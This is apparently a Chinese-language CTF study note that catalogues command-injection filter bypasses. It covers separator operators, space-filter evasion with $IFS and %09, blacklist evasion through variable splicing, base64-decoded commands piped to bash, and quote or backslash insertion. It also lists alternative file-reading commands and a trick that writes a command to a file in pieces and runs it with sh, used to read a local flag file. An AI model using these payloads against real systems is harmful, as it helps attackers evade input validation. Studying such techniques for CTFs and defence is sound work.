感觉这道题做了2次，还是对某些命令不了解

下面就找了一位师傅的文章，系统的学习一下

常见的管道符

windows

  • |:直接执行后面的语句（必须保证前面是真）
  • ||:如果前面是错的，就直接执行后面的语句，否则就前面
  • &：无论真假都执行
  • &&：如果前面是假，则两条都不执行，如果是真则执行两条 (ps如果管道符被过滤可以尝试一下%0a,换行符绕过)

    linux

    多了一个；，跟&一样

    空格过滤

  • $IFS$9
  • ${IFS}
  • %09(需要php环境)
  • 重定向符<>,<(这个尝试后好像不行，但是师傅做的可以（root@kali:~# cat<>flag

    this is your flag )(有常识了一下，cat<flag可以，但是cat<flag.htm不行，现在试试cat f.php,cat flag是可以的，晚上回来了在研究研究)

    黑名单绕过

    拼接

    a=c;b=at;c=fl;d=ag;$a$b $c$d

    base64编码

    \`echo Y2F0IGZsYWc=|base64 -d\`

    echo Y2F0IGZsYWc=|base64 -d|bash

    echo Y2F0IGZsYWc=|base64 -d|sh

    单引号和双引号

    c””at fl’’ag

    反斜线

    c\at fl\ag

    $1,$2等和$@

    c$1at f$@lag

    读文件绕过

    (1)more:一页一页的显示档案内容

    (2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页

    (3)head:查看头几行

    (4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示

    (5)tail:查看尾几行

    (6)nl：显示的时候，顺便输出行号

    (7)od:以二进制的方式读取档案内容

    (8)vi:一种编辑器，这个也可以查看

    (9)vim:一种编辑器，这个也可以查看

    (10)sort:可以查看

    (11)uniq:可以查看

    (12)file -f:报错出具体内容

    内敛执行绕过

    \`命令\`和$(命令)都是执行方式

    echo “xx`pwd`“

    echo “xx$(pwd)”

    绕过长度限制

    见原博客

    linux中命令换行

    在linux，但我们执行文件的时候，我们通过在没有写完的命令后面加\，可以将一条命令写多行 root@kali:~# ca\

    t\

    fl\

    ag

    this is your flag

    既然可以这样那我们是不是可以在某些限制长度的情况下执行命令，将命令一条一条输入一个文本中再执行，尝试一下

    root@kali:~# echo “ca\“>cmd

    root@kali:~# echo “t\“>>cmd

    root@kali:~# echo “ fl\“>>cmd

    root@kali:~# echo “ag”>>cmd

    root@kali:~# cat cmd

    ca\

    t\

    fl\

    ag

    root@kali:~# sh cmd

    this is your flag

    用这种方法可以绕过一些长度限制读取文件内容
